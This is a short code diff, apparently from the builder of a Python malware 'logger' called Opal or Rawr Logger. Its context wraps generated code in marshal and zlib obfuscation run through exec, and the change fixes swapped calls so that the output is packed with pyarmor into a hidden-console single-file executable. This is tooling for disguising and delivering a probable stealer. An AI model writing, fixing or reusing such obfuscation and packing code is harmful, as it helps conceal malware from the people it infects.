@@ -36,8 +36,8 @@ with open(f'{name}.py') as fi:
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
     if compile == "y":
-        os.system(f'{name}.py')
-        os.remove(f'pyarmor pack -e "--onefile --noconsole " {name}.spec')
+        os.system(f'pyarmor pack -e "--onefile --noconsole " {name}.py')
+        os.remove(f'{name}.spec')
         Write.Print("Opal Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(2)
         Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.green_to_blue, interval=0.01) 
